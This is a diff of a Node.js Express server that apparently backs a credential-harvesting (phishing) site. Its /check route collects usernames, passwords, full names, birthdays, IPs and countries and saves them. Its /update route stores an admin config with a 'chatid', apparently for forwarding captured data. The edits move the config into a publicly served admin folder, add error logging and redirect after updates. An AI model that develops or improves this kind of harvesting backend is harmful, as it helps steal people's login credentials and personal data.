@@ -11,10 +11,9 @@ app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-
 const adminPath = path.join(__dirname, 'admin');
 const clientPath = path.join(__dirname, 'client');
-const configPath = path.join(__dirname, 'config.json');
+const configPath = path.join(__dirname, 'admin/config.json');
 app.use(express.static(clientPath));
 app.use(express.static(adminPath));
 app.get('/', (res) => {
@@ -46,6 +45,7 @@ app.post('/check', async (req, res) => {
             saveInfo(result, ip, country, username, password, fullname, birthday);
         }
     } catch (error) {
+        console.log(error);
         try { await close(); }
         catch {
         }
@@ -79,7 +79,7 @@ app.post('/update', (req, res) => {
         chatid: req.body.chatid
     };
     fs.writeFileSync(configPath, JSON.stringify(configInfo, null, 2));
-    res.send('Thành công');
+    res.redirect('/admin');
 });
 
 server.listen(port, () => {
